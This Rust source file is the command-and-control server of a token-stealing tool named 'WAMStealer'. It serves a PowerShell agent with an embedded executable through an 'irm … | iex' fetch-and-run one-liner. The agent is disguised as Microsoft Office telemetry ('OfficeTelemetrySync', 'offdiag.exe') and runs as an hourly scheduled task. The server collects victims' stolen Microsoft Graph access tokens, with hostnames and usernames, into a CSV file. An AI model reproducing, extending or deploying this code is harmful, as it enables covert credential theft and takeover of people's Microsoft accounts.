use std::{
    net::SocketAddr,
    path::{Path, PathBuf},
    process::ExitCode,
    sync::Arc,
};

use wamstealer::beacon::Beacon;
use wamstealer_server::{ingest, ps1};
use axum::{
    extract::{ConnectInfo, DefaultBodyLimit, State},
    http::{header, HeaderMap, StatusCode},
    response::{IntoResponse, Response},
    routing::{get, post},
    Json, Router,
};
use clap::Parser;

#[derive(Parser)]
struct Args {
    #[arg(long)]
    domain: String,
    #[arg(long, default_value = "0.0.0.0:443")]
    listen: String,
    #[arg(long, default_value = "/etc/letsencrypt/live")]
    cert_dir: PathBuf,
    #[arg(long, default_value = "tokens.csv")]
    csv: PathBuf,
    #[arg(long)]
    secret: Option<String>,
    #[arg(long, default_value = "d3590ed6-52b3-4102-aeff-aad2292ab01c")]
    client_id: String,
    #[arg(long, default_value = "https://graph.microsoft.com/.default")]
    scope: String,
    #[arg(long, default_value = "common")]
    authority: String,
    #[arg(long, default_value = "Microsoft\\OfficeTelemetry")]
    install_subdir: String,
    #[arg(long, default_value = "OfficeTelemetrySync")]
    task_name: String,
    #[arg(long, default_value = "offdiag.exe")]
    exe_name: String,
    #[arg(long, default_value = "agent.ps1")]
    script_name: String,
    #[arg(long, default_value = "/agent.ps1")]
    script_path: String,
}

struct SharedState {
    secret: String,
    script: String,
    client_id: String,
    scope: String,
    authority: String,
    csv_path: PathBuf,
}

#[derive(Clone)]
struct AppState {
    inner: Arc<SharedState>,
}

const AGENT_EXE: &[u8] = include_bytes!(env!("WAMSTEALER_AGENT_EXE"));

fn timestamp_now() -> String {
    chrono::Utc::now().to_rfc3339_opts(chrono::SecondsFormat::Secs, true)
}

fn constant_time_eq(left: &[u8], right: &[u8]) -> bool {
    if left.len() != right.len() {
        return false;
    }
    let mut diff = 0u8;
    for (a, b) in left.iter().zip(right.iter()) {
        diff |= a ^ b;
    }
    diff == 0
}

fn authorized(headers: &HeaderMap, secret: &str) -> bool {
    headers
        .get("x-auth")
        .and_then(|value| value.to_str().ok())
        .is_some_and(|value| constant_time_eq(value.as_bytes(), secret.as_bytes()))
}

async fn serve_script(State(state): State<AppState>, connect: ConnectInfo<SocketAddr>) -> Response {
    println!(
        "[{}] agent script served to {}",
        timestamp_now(),
        connect.0.ip()
    );
    (
        [
            (header::CONTENT_TYPE, "text/plain; charset=utf-8"),
            (header::CACHE_CONTROL, "no-store"),
        ],
        state.inner.script.clone(),
    )
        .into_response()
}

async fn serve_config(State(state): State<AppState>) -> Response {
    Json(serde_json::json!({
        "client_id": state.inner.client_id,
        "scope": state.inner.scope,
        "authority": state.inner.authority,
    }))
    .into_response()
}

// The auth check runs as middleware so it rejects unauthenticated requests
// before any body extraction, including the JSON of /ingest.
async fn require_auth(
    State(state): State<AppState>,
    request: axum::extract::Request,
    next: axum::middleware::Next,
) -> Response {
    if !authorized(request.headers(), &state.inner.secret) {
        return StatusCode::FORBIDDEN.into_response();
    }
    next.run(request).await
}

async fn ingest_tokens(State(state): State<AppState>, Json(beacon): Json<Beacon>) -> Response {
    let processed = ingest::process(&beacon, chrono::Utc::now());
    let summary = format!(
        "[{}] beacon {}\\{} ({}): {} token(s), {} error(s), {} rejected",
        timestamp_now(),
        beacon.hostname,
        beacon.username,
        beacon.agent,
        processed.rows.len(),
        processed.errors.len(),
        processed.rejected,
    );
    println!("{summary}");
    for (username, error) in &processed.errors {
        println!(
            "[{}]   err {} {}",
            timestamp_now(),
            username.as_deref().unwrap_or("(unknown account)"),
            error
        );
    }
    for row in &processed.rows {
        let shown = row.token.get(..27).unwrap_or(&row.token);
        println!(
            "[{}]   ok   {}  tid={}  exp={}  scp={}  token={}... ({} chars)",
            timestamp_now(),
            if row.upn.is_empty() { "(no upn)" } else { &row.upn },
            if row.tenant_id.is_empty() { "?" } else { &row.tenant_id },
            if row.expires_utc.is_empty() { "?" } else { &row.expires_utc },
            row.scope,
            shown,
            row.token.len(),
        );
    }
    let written = match ingest::append_csv(&state.inner.csv_path, &processed.rows) {
        Ok(count) => count,
        Err(error) => {
            eprintln!("[{}] csv write failed: {error}", timestamp_now());
            0
        }
    };
    (
        StatusCode::OK,
        format!(
            "received: {} token(s), {} error(s), {} rejected, {} csv row(s)",
            processed.rows.len(),
            processed.errors.len(),
            processed.rejected,
            written,
        ),
    )
        .into_response()
}

fn load_or_create_secret(args: &Args) -> String {
    if let Some(secret) = &args.secret {
        println!("Using --secret from the command line.");
        return secret.clone();
    }
    let path = PathBuf::from("server.secret");
    if let Ok(existing) = std::fs::read_to_string(&path) {
        let trimmed = existing.trim();
        if !trimmed.is_empty() {
            println!("Using shared secret from {}.", path.display());
            return trimmed.to_string();
        }
    }
    let mut bytes = [0u8; 32];
    getrandom::fill(&mut bytes).expect("system randomness is available");
    let secret: String = bytes.iter().map(|byte| format!("{byte:02x}")).collect();
    std::fs::write(&path, &secret).expect("server.secret is writable in the working directory");
    println!("Generated a new shared secret in {}.", path.display());
    secret
}

fn certificate_paths(args: &Args) -> (PathBuf, PathBuf) {
    let dir = args.cert_dir.join(&args.domain);
    (dir.join("fullchain.pem"), dir.join("privkey.pem"))
}

fn print_cert_instructions(domain: &str, cert_dir: &Path) {
    println!();
    println!("No Let's Encrypt certificate found for {domain}.");
    println!();
    println!("Expected files:");
    println!("  {}/fullchain.pem", cert_dir.join(domain).display());
    println!("  {}/privkey.pem", cert_dir.join(domain).display());
    println!();
    println!("Get a certificate with certbot (port 80 must be reachable and free):");
    println!("  sudo apt install certbot");
    println!("  sudo certbot certonly --standalone -d {domain}");
    println!();
    println!("Point your DNS A record at this server first. Then start the server");
    println!("again. Certificates renewed by 'certbot renew' are reloaded automatically.");
    println!();
}

fn warn_certificate_expiry(args: &Args) {
    let (cert_path, _) = certificate_paths(args);
    use x509_parser::prelude::*;
    let Ok((pem, _)) = std::fs::File::open(&cert_path)
        .map_err(|e| e.to_string())
        .and_then(|file| Pem::read(std::io::BufReader::new(file)).map_err(|e| e.to_string()))
    else {
        return;
    };
    let Ok(certificate) = pem.parse_x509() else {
        return;
    };
    let remaining_days =
        (certificate.validity().not_after.timestamp() - chrono::Utc::now().timestamp()) / 86_400;
    if remaining_days < 14 {
        println!(
            "warning: the certificate for {} expires in {remaining_days} day(s); run 'sudo certbot renew'.",
            args.domain
        );
    }
}

async fn run(args: Args) -> Result<(), String> {
    let secret = load_or_create_secret(&args);
    let (cert_path, key_path) = certificate_paths(&args);
    if !cert_path.is_file() || !key_path.is_file() {
        print_cert_instructions(&args.domain, &args.cert_dir);
        return Err(format!("missing certificate for {}", args.domain));
    }
    warn_certificate_expiry(&args);

    let script = ps1::build_agent_script(
        &ps1::AgentSettings {
            server_url: format!("https://{}", args.domain),
            secret: secret.clone(),
            install_subdir: args.install_subdir.clone(),
            task_name: args.task_name.clone(),
            exe_name: args.exe_name.clone(),
            script_name: args.script_name.clone(),
        },
        AGENT_EXE,
    );

    let state = AppState {
        inner: Arc::new(SharedState {
            secret,
            script,
            client_id: args.client_id.clone(),
            scope: args.scope.clone(),
            authority: args.authority.clone(),
            csv_path: args.csv.clone(),
        }),
    };

    let protected = Router::new()
        .route("/config", get(serve_config))
        .route("/ingest", post(ingest_tokens))
        .layer(axum::middleware::from_fn_with_state(
            state.clone(),
            require_auth,
        ));
    let app = Router::new()
        .route(args.script_path.as_str(), get(serve_script))
        .merge(protected)
        .layer(DefaultBodyLimit::max(10 * 1024 * 1024))
        .with_state(state);

    let _ = rustls::crypto::ring::default_provider().install_default();
    let config = axum_server::tls_rustls::RustlsConfig::from_pem_file(cert_path, key_path)
        .await
        .map_err(|error| format!("loading certificate: {error}"))?;

    let address: SocketAddr = args
        .listen
        .parse()
        .map_err(|error| format!("invalid --listen: {error}"))?;

    println!("WAMStealer server");
    println!("  domain:        {}", args.domain);
    println!("  listen:        {}", args.listen);
    println!(
        "  certificate:   {} (reloaded automatically on renewal)",
        args.cert_dir.join(&args.domain).display()
    );
    println!("  tokens csv:    {}", args.csv.display());
    println!(
        "  agent config:  client_id={} scope={} authority={}",
        args.client_id, args.scope, args.authority
    );
    println!(
        "  install dir:   %LOCALAPPDATA%\\{}  task: {} (hourly)",
        args.install_subdir, args.task_name
    );
    println!("  agent script:  https://{}{}", args.domain, args.script_path);
    println!(
        "  delivery:      irm https://{}{} | iex",
        args.domain, args.script_path
    );
    println!();

    let server = axum_server::bind_rustls(address, config);
    if let Err(error) = server
        .serve(app.into_make_service_with_connect_info::<SocketAddr>())
        .await
    {
        return Err(format!(
            "serving {address}: {error}\nhint: port 443 requires root, or allow it for the \
             binary with: sudo setcap 'cap_net_bind_service=+ep' <path to wamstealer-server>"
        ));
    }
    Ok(())
}

#[tokio::main]
async fn main() -> ExitCode {
    match run(Args::parse()).await {
        Ok(()) => ExitCode::SUCCESS,
        Err(message) => {
            eprintln!("error: {message}");
            ExitCode::FAILURE
        }
    }
}
